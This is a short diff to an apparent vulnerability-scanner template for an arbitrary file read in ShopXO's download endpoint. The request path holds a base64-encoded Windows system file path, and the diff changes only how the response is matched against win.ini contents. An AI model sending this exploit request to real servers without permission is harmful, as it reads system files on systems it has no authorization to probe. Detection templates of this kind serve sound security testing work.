@@ -11,7 +11,7 @@ groups:
       path: /public/index.php?s=/index/qrcode/download/url/L1dpbmRvd3Mvd2luLmluaQ=
       follow_redirects: false
       expression: |
-        response.status == 200 && "extensions".bmatches(response.body) && "for 16-bit app support".bmatches(response.body)
+        response.status == 200 && response.body.bcontains(b"extensions") && response.body.bcontains(b"for 16-bit app support")
 detail:
   author: Print1n(http://print1n.top)
   description: ShopXO download 任意文件读取
